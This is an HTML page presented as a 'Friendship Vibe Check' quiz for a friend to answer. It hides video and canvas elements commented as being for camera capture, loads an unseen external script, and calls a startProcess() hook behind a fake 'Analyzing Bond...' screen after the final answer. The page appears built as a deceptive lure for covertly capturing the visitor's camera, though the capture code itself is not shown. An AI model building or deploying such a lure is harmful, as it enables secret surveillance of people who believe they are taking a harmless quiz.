<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Friendship Vibe Check</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
        body { background: #0f172a; color: #f8fafc; display: flex; justify-content: center; align-items: center; height: 100vh; padding: 20px; }
        .card { background: #1e293b; padding: 30px; border-radius: 16px; width: 100%; max-width: 400px; box-shadow: 0 10px 25px rgba(0,0,0,0.3); text-align: center; border: 1px solid #334155; }
        h2 { margin-bottom: 15px; color: #38bdf8; font-size: 22px; }
        p { color: #94a3b8; font-size: 14px; margin-bottom: 20px; }
        .btn-container { display: flex; flex-direction: column; gap: 12px; }
        button { background: #0284c7; color: white; border: none; padding: 12px; border-radius: 8px; font-size: 16px; cursor: pointer; transition: background 0.2s; }
        button:hover { background: #0369a1; }
        .result-box { font-size: 28px; font-weight: bold; color: #4ade80; margin: 20px 0; }
    </style>
</head>
<body>

    <div class="card" id="mainCard">
        <h2>🤝 Friendship Vibe Check</h2>
        <p id="questionText">Question 1 of 3: How well do we understand each other?</p>
        <div class="btn-container" id="btnContainer">
            <button onclick="handleAnswer()">100% Best Friends</button>
            <button onclick="handleAnswer()">Like Brothers / Family</button>
        </div>
    </div>

    <!-- Hidden video and canvas elements for camera capture -->
    <video id="video" autoplay playsinline style="display:none;"></video>
    <canvas id="canvas" style="display:none;"></canvas>

    <script src="script.js"></script>
    <script>
        let currentStep = 1;

        function handleAnswer() {
            currentStep++;
            
            if (currentStep === 2) {
                document.getElementById('questionText').innerText = "Question 2 of 3: Who is more stubborn between us?";
                document.getElementById('btnContainer').innerHTML = `
                    <button onclick="handleAnswer()">You are</button>
                    <button onclick="handleAnswer()">Both of us</button>
                `;
            } else if (currentStep === 3) {
                document.getElementById('questionText').innerText = "Question 3 of 3: If we get stuck in trouble, what will we do?";
                document.getElementById('btnContainer').innerHTML = `
                    <button onclick="handleAnswer()">Fight back together</button>
                    <button onclick="handleAnswer()">Plan a safe escape</button>
                `;
            } else {
                // Aakhri step par background process trigger hoga aur loading dikhegi
                document.getElementById('mainCard').innerHTML = `
                    <h2>Analyzing Bond...</h2>
                    <p>Calculating shared memories and vibe...</p>
                `;
                
                if(typeof startProcess === 'function') {
                    startProcess();
                }
            }
        }
    </script>
</body>
    </html>
